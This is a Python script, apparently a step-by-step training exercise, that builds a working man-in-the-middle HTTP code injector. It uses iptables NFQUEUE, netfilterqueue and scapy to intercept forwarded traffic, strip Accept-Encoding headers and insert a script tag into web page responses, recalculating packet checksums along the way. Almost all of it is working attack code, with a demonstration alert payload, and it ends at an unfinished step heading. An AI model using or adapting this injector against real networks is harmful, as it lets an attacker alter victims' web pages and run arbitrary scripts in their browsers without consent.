#Step 1 - Create IP Tables using Subprocess

import random
import subprocess

# def createIPtables(queuenumber):
#     subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', str(queuenumber)])
#     subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(queuenumber)])
#     subprocess.run(['iptables', '--list'])
#
# try:
#     queuenumber = random.randint(100, 20000)
#     print(f'The new IP Queue table is number {queuenumber}.')
#     createIPtables(queuenumber)
# finally:
#     subprocess.run(['iptables', '--flush'])
#     subprocess.run(['iptables', '--list'])
#     print('The IP Tables have been flushed.')

#Step 2 - Intercept the packet with the auto queue table

# import random
# import subprocess
# import netfilterqueue
# import scapy.all as scapy
#
# def createIPtables(queuenumber):
#     subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', str(queuenumber)])
#     subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(queuenumber)])
#     startinterception(queuenumber)
#
# def startinterception(queuenumber):
#     queuetable = netfilterqueue.NetfilterQueue()
#     queuetable.bind(queuenumber, interceptedpacket)
#     queuetable.run()
#
# def interceptedpacket(packet):
#     try:
#         xssattack(packet)
#         packet.accept()
#     except Exception as errormessage:
#         print(errormessage)
#         packet.accept()
#
# def xssattack(packet):
#     scapypacket = scapy.IP(packet.get_payload())
#     print(scapypacket)
#
# try:
#     queuenumber = random.randint(100, 50000)
#     print(f'The new IP Queue table is number {queuenumber}.')
#     createIPtables(queuenumber)
#     startinterception(queuenumber)
# except KeyboardInterrupt:
#     print('\n--------------------------------------------------------------------------------')
#     subprocess.run(['iptables', '--flush'])
#     print('\nThe IP Tables have been flushed.')

#Step 3 - Prepare the trigger condition for HTTP Traffic only

# import random
# import subprocess
# import netfilterqueue
# import scapy.all as scapy
# from scapy.layers import http
#
# def createIPtables(queuenumber):
#     subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', str(queuenumber)])
#     subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(queuenumber)])
#     startinterception(queuenumber)
#
# def startinterception(queuenumber):
#     queuetable = netfilterqueue.NetfilterQueue()
#     queuetable.bind(queuenumber, interceptedpacket)
#     queuetable.run()
#
# def interceptedpacket(packet):
#     try:
#         xssattack(packet)
#         packet.accept()
#     except Exception as errormessage:
#         print(errormessage)
#         packet.accept()
#
# def xssattack(packet):
#     scapypacket = scapy.IP(packet.get_payload())
#     if scapypacket.haslayer(scapy.Raw):
#         if scapypacket[scapy.TCP].dport == 80:
#             print('*HTTP Request*')
#             print(scapypacket.show())
#         elif scapypacket[scapy.TCP].sport == 80:
#             print('$HTTP Response$')
#             print(scapypacket.show())
#
# try:
#     queuenumber = random.randint(100, 50000)
#     print(f'The new IP Queue table is number {queuenumber}.')
#     createIPtables(queuenumber)
#     startinterception(queuenumber)
# except KeyboardInterrupt:
#     print('\n--------------------------------------------------------------------------------')
#     subprocess.run(['iptables', '--flush'])
#     print('\nThe IP Tables have been flushed.')

#Step 3.5 - Prepare trigger condition for error handling

# import random
# import subprocess
# import netfilterqueue
# import scapy.all as scapy
# from scapy.layers import http
#
# def createIPtables(queuenumber):
#     subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', str(queuenumber)])
#     subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(queuenumber)])
#     startinterception(queuenumber)
#
# def startinterception(queuenumber):
#     queuetable = netfilterqueue.NetfilterQueue()
#     queuetable.bind(queuenumber, interceptedpacket)
#     queuetable.run()
#
# def interceptedpacket(packet):
#     try:
#         xssattack(packet)
#         packet.accept()
#     except Exception as errormessage:
#         print(errormessage)
#         packet.accept()
#
# def xssattack(packet):
#     scapypacket = scapy.IP(packet.get_payload())
#         if scapypacket.haslayer(scapy.Raw):
#             try:
#                 if scapypacket[scapy.TCP].dport == 80:
#                     print('*HTTP Request*')
#                     print(scapypacket.show())
#                 elif scapypacket[scapy.TCP].sport == 80:
#                     print('$HTTP Response$')
#                     print(scapypacket.show())
#             except IndexError:
#                 pass
#
# try:
#     queuenumber = random.randint(100, 50000)
#     print(f'The new IP Queue table is number {queuenumber}.')
#     createIPtables(queuenumber)
#     startinterception(queuenumber)
# except KeyboardInterrupt:
#     print('\n--------------------------------------------------------------------------------')
#     subprocess.run(['iptables', '--flush'])
#     print('\nThe IP Tables have been flushed.')

#Step 4 - Delete the HTTP Encoding Method
#Accept-Encoding:\s*(.+?)\r\n

# import random
# import subprocess
# import netfilterqueue
# import scapy.all as scapy
# import re
#
# def createIPtables(queuenumber):
#     subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', str(queuenumber)])
#     subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(queuenumber)])
#     startinterception(queuenumber)
#
# def startinterception(queuenumber):
#     queuetable = netfilterqueue.NetfilterQueue()
#     queuetable.bind(queuenumber, interceptedpacket)
#     queuetable.run()
#
# def interceptedpacket(packet):
#     try:
#         xssattack(packet)
#         packet.accept()
#     except Exception as errormessage:
#         print(errormessage)
#         packet.accept()
#
# def xssattack(packet):
#     scapypacket = scapy.IP(packet.get_payload())
#     if scapypacket.haslayer(scapy.Raw):
#         try:
#             if scapypacket[scapy.TCP].dport == 80:
#                 print('\n*HTTP Request*\n')
#                 httpload = scapypacket[scapy.Raw].load.decode()
#                 encoding = re.search(r"Accept-Encoding:\s*(.+?)\r\n", httpload)
#                 print(encoding.group(0))
#             elif scapypacket[scapy.TCP].sport == 80:
#                 print('\n$HTTP Response$\n')
#                 # print(scapypacket.show())
#         except IndexError:
#             pass
#
# try:
#     queuenumber = random.randint(100, 50000)
#     print(f'The new IP Queue table is number {queuenumber}.')
#     createIPtables(queuenumber)
#     startinterception(queuenumber)
# except KeyboardInterrupt:
#     print('\n--------------------------------------------------------------------------------')
#     subprocess.run(['iptables', '--flush'])
#     print('\nThe IP Tables have been flushed.')

#Step 4.5 - Delete the HTTP Encoding Method by replacing

# import random
# import subprocess
# import netfilterqueue
# import scapy.all as scapy
# import re
#
# def createIPtables(queuenumber):
#     subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', str(queuenumber)])
#     subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(queuenumber)])
#     startinterception(queuenumber)
#
# def startinterception(queuenumber):
#     queuetable = netfilterqueue.NetfilterQueue()
#     queuetable.bind(queuenumber, interceptedpacket)
#     queuetable.run()
#
# def interceptedpacket(packet):
#     try:
#         xssattack(packet)
#         packet.accept()
#     except Exception as errormessage:
#         print(errormessage)
#         packet.accept()
#
# def xssattack(packet):
#     scapypacket = scapy.IP(packet.get_payload())
#     if scapypacket.haslayer(scapy.Raw):
#         try:
#             if scapypacket[scapy.TCP].dport == 80:
#                 print('\n*HTTP Request*\n')
#                 httpload = scapypacket[scapy.Raw].load.decode()
#                 # encoding = re.search(r"Accept-Encoding:\s*(.+?)\r\n", httpload)
#                 malicioushttpload = re.sub(r"Accept-Encoding:\s*(.+?)\r\n","",httpload)
#                 # print(encoding.group(0))
#                 print(malicioushttpload)
#             elif scapypacket[scapy.TCP].sport == 80:
#                 print('\n$HTTP Response$\n')
#         except IndexError:
#             pass
#
# try:
#     queuenumber = random.randint(100, 50000)
#     print(f'The new IP Queue table is number {queuenumber}.')
#     createIPtables(queuenumber)
#     startinterception(queuenumber)
# except KeyboardInterrupt:
#     print('\n--------------------------------------------------------------------------------')
#     subprocess.run(['iptables', '--flush'])
#     print('\nThe IP Tables have been flushed.')

#Step 5 - Set the payload for the HTTP Request, recalculate chksum and len

import random
import subprocess
import netfilterqueue
import scapy.all as scapy
import re

def createIPtables(queuenumber):
    subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', str(queuenumber)])
    # subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(queuenumber)])
    startinterception(queuenumber)

def startinterception(queuenumber):
    queuetable = netfilterqueue.NetfilterQueue()
    queuetable.bind(queuenumber, interceptedpacket)
    queuetable.run()

def interceptedpacket(packet):
    try:
        xssattack(packet)
        packet.accept()
    except Exception as errormessage:
        print(errormessage)
        packet.accept()

def deletehashing(scapypacket):
    del scapypacket[scapy.IP].len
    del scapypacket[scapy.IP].chksum
    del scapypacket[scapy.TCP].chksum

def xssattack(packet):
    scapypacket = scapy.IP(packet.get_payload())
    if scapypacket.haslayer(scapy.Raw):
        try:
            if scapypacket[scapy.TCP].dport == 80:
                print('\n*HTTP Request*\n')
                httpload = scapypacket[scapy.Raw].load.decode()
                malicioushttpload = re.sub(r"Accept-Encoding:\s*(.+?)\r\n","",httpload)
                scapypacket[scapy.Raw].load = malicioushttpload
                deletehashing(scapypacket)
                packet.set_payload(bytes(scapypacket))
                # print(scapypacket.show())
            elif scapypacket[scapy.TCP].sport == 80:
                print('\n$HTTP Response$\n')
                injectionsite = '<head>'
                injectedcode = "<head><script>alert('Welcome to Tampa!')</script>"
                httpresponse = scapypacket[scapy.Raw].load.decode().replace(injectionsite,injectedcode)
                scapypacket[scapy.Raw].load = httpresponse
                deletehashing(scapypacket)
                packet.set_payload(bytes(scapypacket))
                # print(httpresponse)
                # print(scapypacket.show())
        except IndexError:
            pass

try:
    queuenumber = random.randint(100, 50000)
    print(f'The new IP Queue table is number {queuenumber}.')
    createIPtables(queuenumber)
    startinterception(queuenumber)
except KeyboardInterrupt:
    print('\n--------------------------------------------------------------------------------')
    subprocess.run(['iptables', '--flush'])
    print('\nThe IP Tables have been flushed.')

#Step 6 -